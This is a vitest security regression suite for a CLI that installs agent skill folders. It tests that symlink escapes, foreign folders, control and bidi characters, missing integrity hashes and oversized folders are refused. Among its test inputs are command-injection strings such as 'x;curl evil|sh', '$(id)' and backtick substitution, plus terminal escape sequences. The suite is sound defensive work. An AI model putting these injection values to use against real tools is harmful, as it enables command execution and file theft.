import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { linkStatus } from "./agents.js";
import { hashDir } from "./fs.js";
import { loadLock, loadManifest, makeContext, storePath, validateManifest } from "./manifest.js";
import { addSkill, doctor, removeSkill, syncSkills, updateSkills } from "./ops.js";
import { loadRegistry } from "./registry.js";
import { isSkillDir, readSkill } from "./skill.js";
import { fetchSource, parseSource } from "./source.js";
import type { Context, Lockfile, Manifest } from "./types.js";

const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

let base: string, home: string, proj: string, outside: string, ctx: Context;
const savedEnv = { ...process.env };

function writeSkill(dir: string, name: string, body = "body", description = "d") {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "SKILL.md"), `---\nname: ${name}\ndescription: ${description}\n---\n${body}\n`);
}

function writeManifest(m: Manifest) {
  fs.writeFileSync(path.join(proj, "skillwharf.json"), JSON.stringify(m));
}

function writeLock(l: Lockfile) {
  fs.writeFileSync(path.join(proj, "skillwharf.lock.json"), JSON.stringify(l));
}

function read(p: string): string {
  return fs.readFileSync(p, "utf8");
}

/** Run the CLI from source in `cwd` against the throwaway home. */
function cli(args: string[], cwd = proj) {
  const r = spawnSync(process.execPath, [path.join(repo, "node_modules/tsx/dist/cli.mjs"), path.join(repo, "src/cli.ts"), ...args], {
    cwd,
    env: { ...process.env, SKILLWHARF_HOME: home },
    encoding: "utf8",
  });
  return { stdout: r.stdout, stderr: r.stderr, status: r.status };
}

/**
 * A local "GitHub": https://github.com/acme/skills.git is rewritten to a bare
 * repo made from `build(work)`, through git's own insteadOf config. No network.
 */
function localGithub(build: (work: string) => void): void {
  const gh = path.join(base, "gh");
  const work = path.join(base, "work");
  const git = (...args: string[]) =>
    execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", ...args], {
      stdio: ["ignore", "pipe", "pipe"],
    })
      .toString()
      .trim();
  git("init", "--quiet", work);
  build(work);
  git("-C", work, "add", "-A");
  git("-C", work, "commit", "--quiet", "-m", "one");
  fs.mkdirSync(path.join(gh, "acme"), { recursive: true });
  git("clone", "--quiet", "--bare", work, path.join(gh, "acme", "skills.git"));
  process.env.GIT_CONFIG_COUNT = "3";
  process.env.GIT_CONFIG_KEY_0 = `url.file://${gh}/.insteadOf`;
  process.env.GIT_CONFIG_VALUE_0 = "https://github.com/";
  process.env.GIT_CONFIG_KEY_1 = "uploadpack.allowAnySHA1InWant";
  process.env.GIT_CONFIG_VALUE_1 = "true";
  process.env.GIT_CONFIG_KEY_2 = "protocol.file.allow";
  process.env.GIT_CONFIG_VALUE_2 = "always";
}

beforeEach(() => {
  base = fs.mkdtempSync(path.join(os.tmpdir(), "skdeck-r4-"));
  home = path.join(base, "home");
  proj = path.join(base, "proj");
  outside = path.join(base, "outside");
  for (const d of [home, proj, outside]) fs.mkdirSync(d, { recursive: true });
  ctx = makeContext({ cwd: proj, home });
});
afterEach(() => {
  for (const k of Object.keys(process.env)) if (k.startsWith("GIT_CONFIG_")) delete process.env[k];
  Object.assign(process.env, savedEnv);
  fs.rmSync(base, { recursive: true, force: true });
});

// ------------------------------------------------------------------ R4-1
describe("R4-1: a symlink inside a GitHub sub-path is never followed", () => {
  beforeEach(() => {
    // The victim: a skill folder outside the fetched repository.
    writeSkill(path.join(outside, "private"), "stolen", "private notes");
    localGithub((work) => {
      writeSkill(path.join(work, "ok"), "ok");
      fs.symlinkSync(outside, path.join(work, "l")); // l -> victim's folder
      fs.symlinkSync(path.join(outside, "private"), path.join(work, "direct")); // last component is the link
    });
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
  });

  it("fetchSource refuses a link in the middle of the sub-path", () => {
    expect(() => fetchSource(parseSource("github:acme/skills/l/private"))).toThrow(/symlink/);
  });

  it("fetchSource refuses a link as the final component", () => {
    expect(() => fetchSource(parseSource("github:acme/skills/direct"))).toThrow(/symlink/);
  });

  it("sync from a manifest with no lock entry copies nothing", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: { x: { source: "github:acme/skills/l/private" } } });
    expect(() => syncSkills(ctx)).toThrow(/symlink/);
    expect(fs.existsSync(storePath(ctx, "x"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  it("add copies nothing and records nothing", () => {
    expect(() => addSkill(ctx, "github:acme/skills/l/private")).toThrow(/symlink/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
  });

  it("still fetches an ordinary sub-path", () => {
    const f = fetchSource(parseSource("github:acme/skills/ok"));
    try {
      expect(isSkillDir(f.dir)).toBe(true);
    } finally {
      f.cleanup();
    }
  });
});

// ------------------------------------------------------------------ R4-2
describe("R4-2: a folder with .git, links or empty directories is never taken for a skillwharf copy", () => {
  let store: string, target: string;

  beforeEach(() => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeManifest({ version: 1, agents: ["claude"], skills: { s: { source: "path:./src/s" } } });
    syncSkills(ctx);
    store = storePath(ctx, "s");
    target = path.join(proj, ".claude", "skills", "s");
  });

  /** Replace the link with a real folder holding the store's exact bytes plus `extra`. */
  function plant(extra: (dir: string) => void) {
    fs.rmSync(target, { recursive: true, force: true });
    fs.cpSync(store, target, { recursive: true });
    extra(target);
  }

  const variants: [string, (dir: string) => void][] = [
    [".git directory", (d) => { fs.mkdirSync(path.join(d, ".git")); fs.writeFileSync(path.join(d, ".git", "HEAD"), "ref: refs/heads/main\n"); }],
    ["symlink", (d) => fs.symlinkSync(path.join(outside), path.join(d, "link"))],
    ["empty directory", (d) => fs.mkdirSync(path.join(d, "empty"))],
  ];

  it("a plain byte-identical copy is still recognised as ours (control)", () => {
    plant(() => {});
    expect(linkStatus(ctx, loadManifest(ctx)!, "claude", "s", store)).toBe("stale-copy");
  });

  describe.each(variants)("with a %s in the agent folder", (_label, extra) => {
    beforeEach(() => plant(extra));
    const intact = () => {
      expect(fs.lstatSync(target).isDirectory()).toBe(true);
      expect(fs.readdirSync(target).length).toBeGreaterThan(1); // SKILL.md plus the extra entry
    };

    it("add refuses without --force and leaves it intact", () => {
      expect(() => addSkill(ctx, path.join(proj, "src", "s"))).toThrow(/not managed/);
      intact();
    });

    it("sync refuses without --force and leaves it intact", () => {
      expect(() => syncSkills(ctx)).toThrow(/not managed/);
      intact();
    });

    it("remove does not delete it", () => {
      removeSkill(ctx, "s");
      intact();
    });

    it("doctor calls it foreign, not a stale copy", () => {
      const msgs = doctor(ctx).map((i) => i.message);
      expect(msgs.some((m) => /not managed by skillwharf/.test(m))).toBe(true);
      expect(msgs.some((m) => /is a copy/.test(m))).toBe(false);
    });
  });
});

// ------------------------------------------------------------------ R4-3
describe("R4-3: agentPaths targets are validated and printed sanitised", () => {
  const m = (p: { projectPath?: string; globalPath?: string }): Manifest =>
    ({ version: 1, agents: ["claude"], skills: {}, agentPaths: { claude: p } }) as Manifest;

  it.each(["\u001b]52;c;x\u0007", "ok/\u009b31m", "a/‮b", "a\nb"])("refuses projectPath %j", (p) => {
    expect(() => validateManifest(m({ projectPath: p }), "skillwharf.json")).toThrow(/control/);
  });

  it("refuses a globalPath with a control character", () => {
    expect(() => validateManifest(m({ globalPath: "x/\u001b[2J" }), "skillwharf.json")).toThrow(/control/);
  });

  it("`where` prints no bidi override even when the project folder name has one", () => {
    const odd = path.join(base, "p‮x");
    fs.mkdirSync(odd);
    const oddCtx = makeContext({ cwd: odd, home });
    writeSkill(path.join(odd, "src", "s"), "s");
    fs.writeFileSync(path.join(odd, "skillwharf.json"), JSON.stringify({ version: 1, agents: ["claude"], skills: {} }));
    addSkill(oddCtx, path.join(odd, "src", "s"));
    const r = cli(["where", "s"], odd);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain(".claude");
    expect(r.stdout).not.toMatch(/‮/);
  });
});

// ------------------------------------------------------------------ R4-4
describe("R4-4: --json output is sanitised and registry entries keep only known fields", () => {
  const unsafe = /[\u0080-\u009f‪-‮⁦-⁩]/;

  it("list --json drops C1 and bidi characters from a SKILL.md description", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    // YAML escapes, so the file itself is ASCII and the parsed string holds the real characters.
    writeSkill(path.join(proj, "src", "s"), "s", "body", `"safe\\u202Etxt\\u009Bred"`);
    addSkill(ctx, path.join(proj, "src", "s"));
    expect(readSkill(storePath(ctx, "s")).description).toMatch(unsafe); // the fixture really carries them
    const r = cli(["list", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("safetxtred");
    expect(r.stdout).not.toMatch(unsafe);
  });

  it("usage --json drops them from skill names and project paths taken from session logs", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    const logs = path.join(home, ".claude", "projects", "p");
    fs.mkdirSync(logs, { recursive: true });
    const line = {
      timestamp: new Date().toISOString(),
      cwd: `${fs.realpathSync(proj)}/x‮y`, // the CLI sees the resolved path (/var -> /private/var on macOS)
      message: { content: [{ type: "tool_use", name: "Skill", input: { skill: "ev‮il\u009b" } }] },
    };
    fs.writeFileSync(path.join(logs, "s.jsonl"), JSON.stringify(line) + "\n");
    const r = cli(["usage", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("evil");
    expect(r.stdout).not.toMatch(unsafe);
  });

  it("search --json emits a registry entry without the fields it does not know", async () => {
    const reg = path.join(base, "reg");
    fs.mkdirSync(reg);
    fs.writeFileSync(
      path.join(reg, "index.json"),
      JSON.stringify({
        version: 1,
        skills: [{ name: "pdf", description: "pdf tools", source: "github:o/r/pdf", extra: "x‮y", nested: { a: 1 } }],
      }),
    );
    const idx = await loadRegistry(reg);
    expect(idx.skills[0]).not.toHaveProperty("extra");
    expect(idx.skills[0]).not.toHaveProperty("nested");
    const r = cli(["search", "pdf", "--registry", reg, "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain('"pdf"');
    expect(r.stdout).not.toContain("extra");
    expect(r.stdout).not.toMatch(unsafe);
  });
});

// ------------------------------------------------------------------ R4-5
describe("R4-5: add --all validates every skill before it writes the first one", () => {
  it("a bad second skill leaves nothing installed and nothing linked", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "multi", "a"), "a");
    writeSkill(path.join(proj, "multi", "b"), '"!!!"');
    expect(() => addSkill(ctx, path.join(proj, "multi"), { all: true })).toThrow(/valid skill name/);
    const m = loadManifest(ctx)!;
    const recorded = Object.keys(m.skills);
    const linked = fs.existsSync(path.join(proj, ".claude", "skills", "a"));
    // Either nothing happened at all, or `a` is fully recorded in both files; never linked but unrecorded.
    if (linked) {
      expect(recorded).toContain("a");
      expect(Object.keys(loadLock(ctx).skills)).toContain("a");
    } else {
      expect(recorded).toEqual([]);
      expect(fs.existsSync(storePath(ctx, "a"))).toBe(false);
    }
  });

  it("a foreign folder at the second skill's target stops the whole run before the first write", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "multi", "a"), "a");
    writeSkill(path.join(proj, "multi", "b"), "b");
    fs.mkdirSync(path.join(proj, ".claude", "skills", "b"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".claude", "skills", "b", "mine.txt"), "mine");
    expect(() => addSkill(ctx, path.join(proj, "multi"), { all: true })).toThrow(/not managed/);
    expect(fs.existsSync(path.join(proj, ".claude", "skills", "a"))).toBe(false);
    expect(fs.existsSync(storePath(ctx, "a"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
    expect(read(path.join(proj, ".claude", "skills", "b", "mine.txt"))).toBe("mine");
  });
});

// ------------------------------------------------------------------ R4-6
describe("R4-6: re-adding a skill checks the agents it will link and keeps its agent list", () => {
  it("re-add without --agents keeps the per-skill list and does not touch another agent's folder", () => {
    writeManifest({ version: 1, agents: ["claude", "agents"], skills: {} });
    writeSkill(path.join(proj, "src", "s"), "s", "v1");
    addSkill(ctx, path.join(proj, "src", "s"), { agents: ["claude"] });
    const lockBefore = loadLock(ctx).skills.s.integrity;
    // someone else's folder at a target the skill was never linked into
    fs.mkdirSync(path.join(proj, ".agents", "skills", "s"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".agents", "skills", "s", "mine.txt"), "mine");
    writeSkill(path.join(proj, "src", "s"), "s", "v2");

    expect(() => addSkill(ctx, path.join(proj, "src", "s"))).not.toThrow();
    expect(loadManifest(ctx)!.skills.s.agents).toEqual(["claude"]);
    expect(read(path.join(proj, ".agents", "skills", "s", "mine.txt"))).toBe("mine");
    expect(loadLock(ctx).skills.s.integrity).toBe(hashDir(storePath(ctx, "s")));
    expect(loadLock(ctx).skills.s.integrity).not.toBe(lockBefore);
  });

  it("a foreign folder at a target named with --agents stops the run before the store is replaced", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "src", "s"), "s", "v1");
    addSkill(ctx, path.join(proj, "src", "s"));
    const storeHash = hashDir(storePath(ctx, "s"));
    const lockText = read(path.join(proj, "skillwharf.lock.json"));
    const manifestText = read(path.join(proj, "skillwharf.json"));
    fs.mkdirSync(path.join(proj, ".agents", "skills", "s"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".agents", "skills", "s", "mine.txt"), "mine");
    writeSkill(path.join(proj, "src", "s"), "s", "v2");

    expect(() => addSkill(ctx, path.join(proj, "src", "s"), { agents: ["claude", "agents"] })).toThrow(/\.agents[/\\]skills[/\\]s/);
    expect(hashDir(storePath(ctx, "s"))).toBe(storeHash);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(lockText);
    expect(read(path.join(proj, "skillwharf.json"))).toBe(manifestText);
    expect(read(path.join(proj, ".agents", "skills", "s", "mine.txt"))).toBe("mine");
  });
});

// ------------------------------------------------------------------ R4-7
describe("R4-7: a symlinked SKILL.md is not a skill", () => {
  beforeEach(() => {
    fs.writeFileSync(path.join(outside, "hosts"), "---\nname: stolen\nversion: 9.9\n---\nlocal file\n");
    fs.mkdirSync(path.join(proj, "src", "s"), { recursive: true });
    fs.symlinkSync(path.join(outside, "hosts"), path.join(proj, "src", "s", "SKILL.md"));
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
  });

  it("isSkillDir says no and readSkill refuses", () => {
    expect(isSkillDir(path.join(proj, "src", "s"))).toBe(false);
    expect(() => readSkill(path.join(proj, "src", "s"))).toThrow(/No SKILL\.md/);
  });

  it("add finds no skill and installs nothing", () => {
    expect(() => addSkill(ctx, path.join(proj, "src", "s"))).toThrow(/No SKILL\.md/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
  });
});

// ------------------------------------------------------------------ R4-8
describe("R4-8: sub-paths are limited to [A-Za-z0-9._-] components", () => {
  it.each(["github:o/r/x;curl evil|sh", "github:o/r/a b", "github:o/r/$(id)", "github:o/r/a`b`", "github:o/r/a&b", "github:o/r/ü"])(
    "parseSource refuses %s",
    (s) => {
      expect(() => parseSource(s)).toThrow(/sub-path/);
    },
  );

  it("parseSource refuses them in a GitHub URL too", () => {
    expect(() => parseSource("https://github.com/o/r/tree/main/a;b")).toThrow(/sub-path/);
  });

  it("still accepts ordinary sub-paths", () => {
    expect(parseSource("github:o/r/skills/pdf-tools_v1.2@main")).toMatchObject({ subpath: "skills/pdf-tools_v1.2" });
  });

  it("a registry drops an entry whose source carries shell metacharacters and keeps the rest", async () => {
    const reg = path.join(base, "reg");
    fs.mkdirSync(reg);
    const e = (name: string, source: string) => ({ name, description: "d", source });
    fs.writeFileSync(
      path.join(reg, "index.json"),
      JSON.stringify({ version: 1, skills: [e("evil", "github:o/r/x;curl evil|sh"), e("good", "github:o/r/good")] }),
    );
    const idx = await loadRegistry(reg);
    expect(idx.skills.map((s) => s.name)).toEqual(["good"]);
  });

  it("a manifest source with a metacharacter is refused when the manifest is used", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: { x: { source: "github:o/r/a;b" } } });
    expect(() => syncSkills(ctx)).toThrow(/sub-path/);
  });
});

// ------------------------------------------------------------------ R4-9
describe("R4-9: a lock entry without integrity is not silently accepted", () => {
  const entry = () => ({
    source: "path:./src/s",
    resolved: `path:${path.join(proj, "src", "s")}`,
    installedAt: "x",
  });

  beforeEach(() => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeManifest({ version: 1, agents: ["claude"], skills: { s: { source: "path:./src/s" } } });
    writeLock({ version: 1, skills: { s: entry() as never } });
  });

  it("sync refuses, names the entry and leaves the lockfile and store alone", () => {
    const before = read(path.join(proj, "skillwharf.lock.json"));
    expect(() => syncSkills(ctx)).toThrow(/"s".*integrity|integrity.*"s"/);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(before);
    expect(fs.existsSync(storePath(ctx, "s"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  it("sync --allow-unpinned installs and writes the missing integrity", () => {
    syncSkills(ctx, { allowUnpinned: true });
    expect(loadLock(ctx).skills.s.integrity).toBe(hashDir(storePath(ctx, "s")));
  });

  it("update regenerates the integrity", () => {
    updateSkills(ctx, ["s"]);
    expect(loadLock(ctx).skills.s.integrity).toMatch(/^sha256-/);
  });

  it("doctor says the entry has no integrity", () => {
    syncSkills(ctx, { allowUnpinned: true });
    const lock = loadLock(ctx);
    delete (lock.skills.s as { integrity?: string }).integrity;
    writeLock(lock);
    expect(doctor(ctx).some((i) => /no integrity/.test(i.message))).toBe(true);
  });
});

// ------------------------------------------------------------------ R4-10
describe("R4-10: a skill folder over the size cap is refused before anything lands in the store", () => {
  function expectUntouched() {
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
  }

  beforeEach(() => writeManifest({ version: 1, agents: ["claude"], skills: {} }));

  it("refuses more than 2000 files by default", () => {
    const dir = path.join(proj, "src", "big");
    writeSkill(dir, "big");
    for (let i = 0; i < 2001; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), "x");
    expect(() => addSkill(ctx, dir)).toThrow(/2000 files|--max-skill-files/);
    expectUntouched();
  });

  it("refuses more bytes than the configured cap", () => {
    const dir = path.join(proj, "src", "fat");
    writeSkill(dir, "fat");
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(() => addSkill(ctx, dir, { limits: { maxBytes: 1024 } })).toThrow(/--max-skill-size/);
    expectUntouched();
  });

  it("accepts it when the cap is raised", () => {
    const dir = path.join(proj, "src", "fat");
    writeSkill(dir, "fat");
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(addSkill(ctx, dir, { limits: { maxBytes: 1024 * 1024 } })).toHaveLength(1);
  });

  it("update refuses an oversized source and leaves the installed store as it was", () => {
    const dir = path.join(proj, "src", "s");
    writeSkill(dir, "s");
    addSkill(ctx, dir);
    const before = hashDir(storePath(ctx, "s"));
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(() => updateSkills(ctx, ["s"], { limits: { maxBytes: 1024 } })).toThrow(/--max-skill-size/);
    expect(hashDir(storePath(ctx, "s"))).toBe(before);
  });
});

// ------------------------------------------------------------------ R4-12
describe("R4-12: reserved directory names are compared after Unicode folding", () => {
  const m = (p: string): Manifest => ({ version: 1, agents: ["claude"], skills: {}, agentPaths: { claude: { projectPath: p } } }) as Manifest;

  it.each([".ſkillwharf/skills", ".sKillwharf/skills", ".ｇit/hooks"])("rejects %j", (p) => {
    expect(() => validateManifest(m(p), "skillwharf.json")).toThrow(/agentPaths/);
  });
});
